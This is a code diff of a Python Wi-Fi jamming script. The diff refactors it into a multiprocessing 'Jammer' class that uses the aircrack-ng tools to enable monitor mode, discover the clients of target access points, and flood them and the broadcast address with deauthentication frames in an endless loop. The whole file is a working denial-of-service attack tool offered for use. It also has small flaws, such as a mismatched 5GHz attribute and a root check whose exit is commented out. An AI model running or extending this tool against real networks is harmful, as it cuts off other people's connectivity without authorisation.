@@ -3,26 +3,213 @@
 Jam a network, disallowing access for everyone or
 ensuring exclusive access for some
 """
-import subprocess
-import os
-import sys
-import atexit
 import argparse
-import time
-import shutil
 import csv
+import multiprocessing
+import multiprocessing.synchronize
+import os
+import shutil
+import subprocess
+import sys
+import threading
+import time
 
-clients = []
+airmon_path: str = ""
+airodump_path: str = ""
+aireplay_path: str = ""
 
 
-def _remove_csv_file():
-    """
-    Remove airodump-ng csv output file
-    """
-    try:
-        os.remove("network_jammer.csv-01.csv")
-    except FileNotFoundError:
-        pass
+class Jammer(multiprocessing.Process):
+    interface: str
+    channel: int
+    bssid: str
+    essid: str | None
+    excludes: list[str]
+    discovery_timeout: int
+    enable_5ghz: bool
+    no_broadcast_deauth: bool
+    clients: list[str]
+    lock: multiprocessing.synchronize.Lock
+
+    def print(self, *values: object, sep: str | None = " ",
+              end: str | None = "\n", flush: bool = False):
+        self.lock.acquire()
+        print(f"{threading.get_native_id()} ({self.bssid}):", *values, sep=sep,
+              end=end, file=sys.stderr, flush=flush)
+        self.lock.release()
+
+    def remove_csv_file(self) -> None:
+        """
+       Remove airodump-ng csv output file
+        """
+        try:
+            os.remove(f"network_jammer.csv-{self.ident:02}.csv")
+        except FileNotFoundError:
+            pass
+
+    def enable_monitor_mode(self) -> None:
+        """
+        Enable monitor mode on an interface
+        """
+        self.print(f"Enabling monitor mode on '{self.interface}'...")
+        process = subprocess.Popen(
+            [airmon_path, "start", self.interface],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True)
+        if process.wait() != 0:
+            self.print(f"Enabling monitor mode on '{self.interface}' failed:\n" +
+                       f"Process output: {process.stdout.read()}")
+            sys.exit(1)
+
+    def switch_channel(self) -> None:
+        """
+        Change channel
+        """
+        self.print(f"Switching to channel {self.channel}...")
+        cmdline = [
+            airmon_path,
+            "start",
+            self.interface,
+            str(self.channel)
+        ]
+        process = subprocess.Popen(cmdline,
+                                   stdout=subprocess.PIPE,
+                                   stderr=subprocess.STDOUT,
+                                   text=True)
+        if process.wait() != 0:
+            self.print(f"Switching to channel {self.channel} failed:\n" +
+                       f"Process output: {process.stdout.read()}")
+            sys.exit(1)
+
+    def read_airodump_csv(self) -> list[str]:
+        """
+        Read airodump's csv output, returning a list of it's lines
+        """
+        try:
+            with open(f"network_jammer.csv-{self.ident:02}.csv", "r",
+                      encoding="utf-8") as stream:
+                lines = stream.read().replace("\0", "").split("\n")
+        except FileNotFoundError:
+            self.print("Client discovery failed")
+            sys.exit(1)
+        os.remove(f"network_jammer.csv-{self.ident:02}.csv")
+        return lines
+
+    def parse_airodump_csv(self, lines: list[str]) -> None:
+        """
+        Parse airodump's csv output
+        """
+        self.clients.clear()
+        csv_reader = csv.reader(lines,
+                                delimiter=",",
+                                skipinitialspace=True)
+        parse_clients = False
+        for row in csv_reader:
+            if len(row) < 1:
+                continue
+            if row[0].strip() == "Station MAC":
+                # Contains client information
+                parse_clients = True
+                continue
+            if parse_clients:
+                if row[5] == self.bssid:
+                    self.clients.append(row[0])
+                    self.print(f"Discovered client: {row[0]}")
+
+    def discover_clients(self) -> None:
+        """
+        Discover all clients connected to the target AP
+        """
+        self.print("Discovering clients...")
+        cmdline = [
+            airodump_path,
+            self.interface,
+            "-a",
+            "-K",
+            "1",
+            "-I",
+            str(self.discovery_timeout),
+            "-w",
+            "network_jammer.csv",
+            "--ignore-negative-one",
+            "--bssid",
+            self.bssid,
+            "--output-format",
+            "csv",
+        ]
+        if self.essid is not None:
+            cmdline.extend(["--essid", self.essid])
+        if self.five_ghz:
+            cmdline.extend(["--band", "abg"])
+        process = subprocess.Popen(cmdline,
+                                   stdout=subprocess.PIPE,
+                                   stderr=subprocess.STDOUT,
+                                   text=True)
+        time.sleep(self.discovery_timeout + 1)
+        if process.poll() is not None:
+            self.print("Discovering clients failed:\n" +
+                       f"Process output: {process.stdout.read()}")
+            sys.exit(1)
+        process.terminate()
+        self.parse_airodump_csv(self.read_airodump_csv())
+
+    def deauth_clients(self):
+        """
+        De-authenticate all clients discovered before
+        """
+        for client in self.clients:
+            self.switch_channel()
+            if client.lower() not in self.excludes:
+                cmdline = [
+                    aireplay_path,
+                    self.interface,
+                    "-0",
+                    "2",
+                    "-a",
+                    self.bssid,
+                    "-c",
+                    client,
+                    "--ignore-negative-one"
+                ]
+                self.print(f"De-authenticating {client}...")
+                process = subprocess.Popen(cmdline,
+                                           stdout=subprocess.PIPE,
+                                           stderr=subprocess.STDOUT,
+                                           text=True)
+                if process.wait() != 0:
+                    self.print(f"De-authenticating {client} failed:\n" +
+                               f"Process output: {process.stdout.read()}")
+            else:
+                self.print(f"Excluding {client} from de-authentication")
+        if not self.no_broadcast_deauth:
+            self.switch_channel()
+            cmdline = [
+                aireplay_path,
+                self.interface,
+                "-0",
+                "5",
+                "-a",
+                self.bssid,
+                "--ignore-negative-one"
+            ]
+            self.print("De-authenticating broadcast...")
+            process = subprocess.Popen(cmdline,
+                                       stdout=subprocess.PIPE,
+                                       stderr=subprocess.STDOUT,
+                                       text=True)
+            if process.wait() != 0:
+                self.print("De-authenticating broadcast failed:\n" +
+                           f"Process output: {process.stdout.read()}")
+
+    def run(self) -> None:
+        self.enable_monitor_mode()
+        while True:
+            self.discover_clients()
+            if len(self.clients) == 0:
+                self.print("No clients found!")
+                continue
+            self.deauth_clients()
 
 
 def _parse_args():
@@ -31,26 +218,28 @@ def _parse_args():
     """
     parser = argparse.ArgumentParser(
         description=_parse_args.__module__.__doc__)
-    parser.add_argument("interface",
-                        help="Interface to operate on")
-    parser.add_argument("--channel",
-                        required=True, type=int,
-                        help="Channel of AP")
-    parser.add_argument("--bssid", required=True,
-                        help="BSSID of AP")
-    parser.add_argument("--essid",
-                        help="ESSID of AP")
+    parser.add_argument("interfaces",
+                        nargs="+", default=[],
+                        help="Interfaces to operate on")
+    parser.add_argument("--channel", dest="channels", required=True, type=int,
+                        nargs="+", default=[],
+                        help="Channels of APs")
+    parser.add_argument("--bssid", required=True, dest="bssids",
+                        nargs="+", default=[],
+                        help="BSSIDs of APs")
+    parser.add_argument("--essid", dest="essids",
+                        nargs="+", default=[],
+                        help="ESSIDs of APs")
     parser.add_argument("--enable-5ghz", dest="five_ghz",
                         help="Operate on 5GHz networks too")
     parser.add_argument("--no-broadcast-deauth",
                         action="store_true",
-                        help="Do not deauthenticate broadcast")
+                        help="Do not de-authenticate broadcast")
     parser.add_argument("--exclude",
                         nargs="+", default=[],
                         help="Exclude certain MAC addresses from"
-                        "deauthentication (implies --no-broadcast-deauth)")
-    parser.add_argument("--discovery-timeout",
-                        type=int, default=3,
+                        "de-authentication (implies --no-broadcast-deauth)")
+    parser.add_argument("--discovery-timeout", type=int, default=3,
                         help="For how long list of associated clients"
                         "is valid before they are discovered again")
     namespace = parser.parse_args(sys.argv[1:])
@@ -73,176 +262,57 @@ def _find_tool(name):
     return path
 
 
-def _enable_monitor_mode(config, airmon_path):
-    """
-    Enable monitor mode on an interface
-    """
-    process = subprocess.Popen(
-        [airmon_path, "start", config.interface],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.PIPE)
-    if process.wait() != 0:
-        print("Putting interface in monitor mode failed:")
-        print(f"Process stderr: {process.stderr.read()}")
-        sys.exit(1)
-
-
-def _switch_channel(config, airmon_path):
-    """
-    Change channel
-    """
-    print(f"Switching to channel {config.channel}...")
-    cmdline = [
-        airmon_path,
-        "start",
-        config.interface,
-        str(config.channel)
-    ]
-    process = subprocess.Popen(cmdline,
-                               stdout=subprocess.DEVNULL,
-                               stderr=subprocess.PIPE)
-    if process.wait() != 0:
-        print("Switching to channel {channel} failed:")
-        print(f"Process stderr: {process.stderr.read()}")
-        sys.exit(1)
-
-
-def _read_airodump_csv():
-    """
-    Read airodump's csv output, returning a list of it's lines
-    """
-    try:
-        with open("network_jammer.csv-01.csv", "r",
-                  encoding="utf-8") as stream:
-            lines = stream.read().replace("\0", "").split("\n")
-    except FileNotFoundError:
-        print("Client discovery failed")
-        sys.exit(1)
-    os.remove("network_jammer.csv-01.csv")
-    return lines
-
-
-def _parse_airodump_csv(config, lines):
-    """
-    Parse airodump's csv output
-    """
-    clients.clear()
-    csv_reader = csv.reader(lines,
-                            delimiter=",",
-                            skipinitialspace=True)
-    parse_clients = False
-    for row in csv_reader:
-        if len(row) < 1:
-            continue
-        if row[0].strip() == "Station MAC":
-            # Contains client information
-            parse_clients = True
-            continue
-        if parse_clients:
-            if row[5] == config.bssid:
-                clients.append(row[0])
-                print(f"Discovered client: {row[0]}")
-
-
-def _discover_clients(config, airodump_path):
-    """
-    Discover all clients connected to the target AP
-    """
-    print("Discovering clients...")
-    cmdline = [
-        airodump_path,
-        config.interface,
-        "-a",
-        "-K",
-        "1",
-        "-I",
-        str(config.discovery_timeout),
-        "-w",
-        "network_jammer.csv",
-        "--ignore-negative-one",
-        "--bssid",
-        config.bssid,
-        "--output-format",
-        "csv",
-    ]
-    if config.essid is not None:
-        cmdline.extend(["--essid", config.essid])
-    if config.five_ghz:
-        cmdline.extend(["--band", "abg"])
-    process = subprocess.Popen(cmdline,
-                               stdout=subprocess.DEVNULL,
-                               stderr=subprocess.PIPE)
-    time.sleep(config.discovery_timeout + 1)
-    if process.poll() is not None:
-        print("airodump process died")
-        print(f"Process stderr: {process.stderr.read()}")
-        sys.exit(1)
-    process.terminate()
-    lines = _read_airodump_csv()
-    _parse_airodump_csv(config, lines)
-
-
-def _deauth_clients(config, aireplay_path, airmon_path):
-    """
-    Deauthenticate all clients discovered before
-    """
-    for client in clients:
-        _switch_channel(config, airmon_path)
-        if client.lower() not in config.exclude:
-            cmdline = [
-                aireplay_path,
-                config.interface,
-                "-0",
-                "2",
-                "-a",
-                config.bssid,
-                "-c",
-                client,
-                "--ignore-negative-one"
-            ]
-            print(f"Deauthenticating {client}...")
-            process = subprocess.Popen(cmdline)
-            if process.wait() != 0:
-                print(f"Deauthenticating {client} failed")
-        else:
-            print(f"Excluding {client} from deauthentication")
-    if not config.no_broadcast_deauth:
-        _switch_channel(config, airmon_path)
-        cmdline = [
-            aireplay_path,
-            config.interface,
-            "-0",
-            "5",
-            "-a",
-            config.bssid,
-            "--ignore-negative-one"
-        ]
-        print("Deauthenticating broadcast...")
-        process = subprocess.Popen(cmdline)
-        if process.wait() != 0:
-            print("Deauthenticating broadcast failed")
-
-
 def main():
     """
-    Main function of jam_network
+       Main function of jam_network
     """
-    config = _parse_args()
-    if os.getuid() != 0:
-        print(f"{os.path.basename(sys.argv[0])} needs to be run as root")
-        sys.exit(1)
-    airmon_path = _find_tool("airmon-ng")
-    airodump_path = _find_tool("airodump-ng")
-    aireplay_path = _find_tool("aireplay-ng")
-    print("Putting interface in monitor mode")
-    _enable_monitor_mode(config, airmon_path)
-    atexit.register(_remove_csv_file)
-    while True:
-        _discover_clients(config, airodump_path)
-        if len(clients) == 0:
-            print("No clients found!")
-            continue
-        _deauth_clients(config, aireplay_path, airmon_path)
+    global airmon_path, airodump_path, aireplay_path
+    jammers: list[Jammer] = []
+    try:
+        config = _parse_args()
+        if os.getuid() != 0:
+            print(f"{os.path.basename(sys.argv[0])} needs to be run as root",
+                  file=sys.stderr)
+            # sys.exit(1)
+        airmon_path = _find_tool("airmon-ng")
+        airodump_path = _find_tool("airodump-ng")
+        aireplay_path = _find_tool("aireplay-ng")
+        thread_count = len(config.interfaces)
+        # Ensure we have all basic information we need
+        if len(config.channels) != thread_count:
+            print(f"{thread_count} interfaces specified but {len(config.channels)} channels defined.",
+                  file=sys.stderr)
+            sys.exit(1)
+
+        if len(config.bssids) != thread_count:
+            print(f"{thread_count} interfaces specified but {len(config.bssids)} BSSIDs defined.",
+                  file=sys.stderr)
+            sys.exit(1)
+        lock = multiprocessing.Lock()
+        for index, interface in enumerate(config.interfaces):
+            jammer = Jammer()
+            jammer.interface = interface
+            jammer.channel = config.channels[index]
+            jammer.bssid = config.bssids[index]
+            jammer.essid = None
+            if len(config.essids) > index:
+                essid = config.essids[index]
+                if len(essid) != 0:
+                    jammer.essid = essid
+            jammer.excludes = config.exclude
+            jammer.discovery_timeout = config.discovery_timeout
+            jammer.enable_5ghz = config.five_ghz
+            jammer.no_broadcast_deauth = config.no_broadcast_deauth
+            jammer.clients = []
+            jammer.lock = lock
+            jammers.append(jammer)
+        for jammer in jammers:
+            jammer.start()
+        for jammer in jammers:
+            jammer.join()
+    except KeyboardInterrupt:
+        for jammer in jammers:
+            jammer.terminate()
 
 
 if __name__ == "__main__":
